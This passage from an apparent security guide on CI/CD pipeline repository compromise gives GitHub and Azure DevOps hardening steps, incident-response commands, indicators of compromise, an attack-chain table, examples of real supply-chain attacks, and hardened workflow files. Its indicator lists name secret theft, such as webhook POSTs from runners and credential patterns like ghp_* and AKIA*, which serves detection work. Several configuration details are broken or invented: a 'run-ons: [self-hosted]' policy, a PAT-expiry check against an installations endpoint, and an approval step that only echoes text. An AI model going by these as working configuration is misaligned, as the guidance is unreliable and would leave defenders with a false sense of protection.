* **Implement Deployment Approvals for production:***
    
    **GitHub Environments:**
    ```yaml
    name: Deploy to Production
    on: [workflow_dispatch]
    jobs:
      deploy:
        environment:
          name: production
          url: https://example.com
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v3
          - name: Deploy
            run: |
              # Deployment steps
              echo "Deploying to production..."
    ```
    
    **Manual Configuration:**
    1. Go to **Repository Settings** → **Environments** → **Production**
    2. Enable **Required reviewers**: Add senior developers
    3. Approval timeout: **24 hours**
    4. **Deployment branches**: Restrict to `main` only

* **Restrict GitHub Actions to approved workflows:**
    
    **Manual Steps:**
    1. Go to **Organization Settings** → **Actions** → **General**
    2. **Policies:**
       - Select **Allow select actions and reusable workflows**
       - Allow: `actions/checkout@*`, `actions/setup-node@*`, `actions/setup-python@*`
       - Disallow: `run-ons: [self-hosted]` (prevent arbitrary code execution)
    3. Click **Save**

#### Access Control & Policy Hardening

* **Conditional Access: Restrict Azure DevOps access to compliant devices**
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Restrict Azure DevOps to Compliant Devices`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **Azure DevOps (Enterprise)**
    5. **Conditions:**
       - Device state: **Require device to be marked as compliant**
    6. **Access controls:**
       - Grant: **Require device to be marked as compliant**
    7. Enable policy: **On**
    8. Click **Create**

* **RBAC: Remove "Owner" role from service accounts**
    
    **Manual Steps (GitHub):**
    1. Go to **Organization Settings** → **Members**
    2. For each service account: Click **Change role** → Select **Maintainer** (not Owner)
    3. Verify: Service accounts can push code but cannot:
       - Delete repositories
       - Modify organization settings
       - Change billing
    
    **Command (Verification):**
    ```bash
    curl -H "Authorization: token $GITHUB_TOKEN" \
      "https://api.github.com/orgs/{org}/members/{username}" | jq '.role'
    ```

#### Validation Command (Verify Mitigations)

```powershell
# Check if branch protection is enforced
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/{owner}/{repo}/branches/main/protection" | \
  jq 'if .enforce_admins == true then "✓ Admins cannot bypass" else "✗ Admins can bypass" end'

# Check if MFA is enforced in organization
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/orgs/{org}" | jq '.two_factor_requirement_enabled'

# Verify PAT expiration is set
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/user/installations" | jq '.[].expires_at'
```

**Expected Output (If Secure):**
```
✓ Admins cannot bypass
true
"2026-04-10T00:00:00Z"
```

**What to Look For:**
- `enforce_admins: true` - Admins cannot bypass branch protection
- `two_factor_requirement_enabled: true` - Organization requires MFA
- `expires_at: <future date>` - Tokens have expiration dates set

---

## 10. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **GitHub/Azure DevOps:**
  - Unexpected commits to `main`/`master` branch outside normal hours
  - New GitHub Actions workflows or Azure Pipeline definitions not approved by code owners
  - Commits with generic messages ("Fix", "Update", "Security patch")
  - Branch protection rule modifications
  - Deletion of workflow logs or audit logs
  - New service accounts or OAuth applications with high privileges

* **Network:**
  - HTTP POST to external webhook endpoints from CI/CD runners
  - Exfiltration of GitHub tokens, npm tokens, or cloud credentials

#### Forensic Artifacts

* **Git Repository:**
  - `git log` contains suspicious commits with exfil/credential keywords
  - `.github/workflows/` directory contains malicious YAML
  - Commit timestamps outside business hours
  
* **Cloud Logs:**
  - AuditLogs contains push events with `action: repo.push`
  - AzureActivity contains unusual pipeline execution
  - GitHub Audit Log shows PAT creation or OAuth app installation
  
* **CI/CD Logs:**
  - Workflow execution logs contain `curl` or `wget` commands posting data
  - Environment variable dumps in logs
  - Credential patterns (`ghp_*`, `npm_*`, `AKIA*`) in plaintext

#### Response Procedures

1.  **Isolate:** 
    **Command:**
    ```bash
    # Immediately revoke compromised credentials
    curl -H "Authorization: token $GITHUB_TOKEN" \
      -X DELETE \
      "https://api.github.com/applications/grants/{grant_id}"
    
    # Revoke Azure DevOps service connections
    az devops service-endpoint delete --organization "https://dev.azure.com/{org}" \
      --id "{endpoint_id}" --yes
    ```
    **Manual (GitHub):**
    - Go to **Organization Settings** → **Personal access tokens** → Revoke all active tokens
    - Go to **Organization Settings** → **Authorized OAuth Apps** → Revoke access for suspicious apps
    
    **Manual (Azure DevOps):**
    - Go to **Project Settings** → **Service Connections** → Delete compromised service connections
    - Force sign-out of all users via Entra ID

2.  **Collect Evidence:**
    **Command:**
    ```bash
    # Export Git commit history
    git log --all --oneline --decorate > /tmp/git-history.txt
    
    # Export GitHub audit logs
    curl -H "Authorization: token $GITHUB_TOKEN" \
      "https://api.github.com/orgs/{org}/audit-log" > /tmp/audit-log.json
    
    # Export Azure activity logs
    az activity-log list --resource-group "{rg}" --output json > /tmp/activity-log.json
    ```
    **Manual:**
    - Download workflow execution logs: **Repository** → **Actions** → Select run → Download logs
    - Export Azure Audit Logs: **Azure Portal** → **Monitor** → **Audit logs** → Download

3.  **Remediate:**
    **Command:**
    ```bash
    # Revert malicious commits
    git revert <commit-hash>
    git push origin main
    
    # Delete malicious workflows
    rm .github/workflows/malicious-workflow.yml
    git commit -m "Remove malicious workflow"
    git push origin main
    
    # Reset branch protection rules
    curl -H "Authorization: token $GITHUB_TOKEN" \
      -X PUT \
      -d '{"enforce_admins": true, "required_pull_request_reviews": {"required_approving_review_count": 2}}' \
      "https://api.github.com/repos/{owner}/{repo}/branches/main/protection"
    ```
    **Manual:**
    - Create new PATs with fresh credentials
    - Reset all OAuth app authorizations
    - Force password reset for all developer accounts
    - Rotate all CI/CD secrets (NPM tokens, Docker registry keys, cloud credentials)

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Resource Development** | **[REC-CLOUD-002]** | ROADtools reconnaissance to enumerate service principals and applications in Entra ID |
| **2** | **Initial Access** | **[IA-PHISH-001]** | Device code phishing to compromise developer account credentials |
| **3** | **Credential Access** | **[CA-CRED-015]** | OAuth consent abuse to obtain high-privilege application tokens |
| **4** | **Current Step** | **[SUPPLY-CHAIN-001]** | **Pipeline Repository Compromise - inject malicious code** |
| **5** | **Execution** | **[EXE-CI-CD-001]** | Trigger CI/CD pipeline to execute malicious workflow and exfiltrate secrets |
| **6** | **Persistence** | **[PERSIST-001]** | Create backdoor service principal or deployment key for continued access |
| **7** | **Exfiltration** | **[EXFIL-001]** | Harvest and exfiltrate GitHub/npm tokens, cloud credentials to attacker infrastructure |
| **8** | **Impact** | **[SUPPLY-CHAIN-002]** | Build System Access Abuse - use stolen tokens to poison downstream packages |

---

## 12. REAL-WORLD EXAMPLES

#### Example 1: GitHub Action tj-actions/changed-files (March 2025)

- **Target:** 23,000+ repositories using popular GitHub Action
- **Timeline:** March 14-15, 2025 (2 days exposure)
- **Technique Status:** Attacker injected malicious commit into tj-actions/changed-files repository, exfiltrating environment variables including GitHub tokens, npm tokens, and API keys
- **Impact:** All repositories using this action during the exposure window leaked secrets to attacker webhook. Credentials were valid and could be used to push malicious packages, access repositories, and compromise CI/CD pipelines downstream
- **Detection:** Community issue reported suspicious environment variable exfiltration in logs. Repository was taken offline within 12 hours
- **Reference:** [Cycode - GitHub Action tj-actions Supply Chain Attack](https://cycode.com/blog/github-action-tj-actions-changed-files-supply-chain-attack-the-complete-guide/)

#### Example 2: Shai-Hulud NPM Supply Chain Attack (August 2025)

- **Target:** 18+ popular npm packages (debug, chalk, etc.) with billions of weekly downloads
- **Timeline:** August 27-28, 2025 (8-hour exposure before takedown)
- **Technique Status:** Attackers compromised maintainer accounts and published trojanized package versions. `postinstall` script executed malicious `bundle.js` that harvested GitHub tokens, npm tokens, and AWS credentials
- **Impact:** Self-propagating worm that used stolen npm tokens to poison additional packages in the same projects. Over 1,000 valid GitHub tokens, cloud credentials, and SSH keys exfiltrated to attacker repositories
- **Detection:** GitHub detected suspicious repository creation patterns and disabled attacker-created repositories within 8 hours
- **Reference:** [Wiz - Shai-Hulud 2.0 Supply Chain Attack](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)

#### Example 3: SolarWinds Supply Chain Compromise (December 2020)

- **Target:** SolarWinds Orion IT management platform
- **Timeline:** Malicious code inserted during build process, distributed in updates 2020-01-31 to 2020-03-02
- **Technique Status:** APT29 (Cozy Bear) compromised SolarWinds build infrastructure and injected SUNBURST backdoor into legitimate updates. Infected updates were signed with SolarWinds' legitimate certificate
- **Impact:** 18,000+ organizations downloaded compromised SolarWinds updates, including U.S. government agencies (Treasury, Commerce, DHS). Attackers gained persistent access to high-value targets
- **Detection:** FireEye identified unusual activity in SolarWinds Orion platform in December 2020, months after initial compromise
- **Reference:** [MITRE - SolarWinds Compromise (C0024)](https://attack.mitre.org/campaigns/C0024/)

---

## Appendix: Secure Pipeline Configuration Examples

### Example 1: Hardened GitHub Actions Workflow

```yaml
name: Secure Build Pipeline
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read
  pull-requests: read

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout code (read-only)
        uses: actions/checkout@v3
        with:
          fetch-depth: 0
          
      - name: Scan secrets
        run: |
          pip install detect-secrets
          detect-secrets scan --baseline .secrets.baseline
          
      - name: Lint and test
        run: |
          npm install
          npm run lint
          npm test
          
      - name: Build (no external calls)
        run: npm run build
        
      - name: SBOM generation
        uses: CycloneDX/cyclonedx-npm@v4
        with:
          output-file: cyclonedx-sbom.json
          
      - name: Sign and hash artifacts
        run: |
          sha256sum dist/* > CHECKSUMS.txt
          gpg --detach-sign CHECKSUMS.txt
          
  deploy:
    needs: build
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    environment:
      name: production
      url: https://example.com
    permissions:
      contents: read
      deployments: read
    steps:
      - name: Wait for approval
        run: echo "Approved by human reviewer"
        
      - name: Deploy to production
        run: echo "Deploying verified artifacts..."
```

### Example 2: Hardened Azure Pipeline

```yaml
trigger:
  - main

pr:
  - main

pool:
  vmImage: 'ubuntu-latest'

variables:
  buildConfiguration: 'Release'

stages:
- stage: Build
  displayName: 'Build and Test'
  jobs:
  - job: BuildJob
    displayName: 'Build Job'
    steps:
    - checkout: self
      fetchDepth: 0
      
    - task: UsePythonVersion@0
      inputs:
        versionSpec: '3.10'
        
    - script: |
        pip install detect-secrets truffleHog
        truffleHog filesystem . --json | tee secrets.json
        if [ -s secrets.json ]; then
          echo "Secrets detected - failing build"
          exit 1
        fi
      displayName: 'Scan for Secrets'
      
    - script: |
        npm install --frozen-lockfile
        npm run lint
        npm test
      displayName: 'Build and Test'
      
    - script: |
        npm run build
        sha256sum dist/* > CHECKSUMS.txt
      displayName: 'Package Artifacts'
      
- stage: Deploy
  displayName: 'Deploy to Production'
  dependsOn: Build
  condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/main'))
  jobs:
  - deployment: ProductionDeploy
    displayName: 'Production Deployment'
    environment: 'production'
    strategy:
      runOnce:
        deploy:
          steps:
          - download: current
            artifact: drop
          - script: |
              echo "Deploying to production..."
              # Deployment scripts here
            displayName: 'Deploy Application'
```

---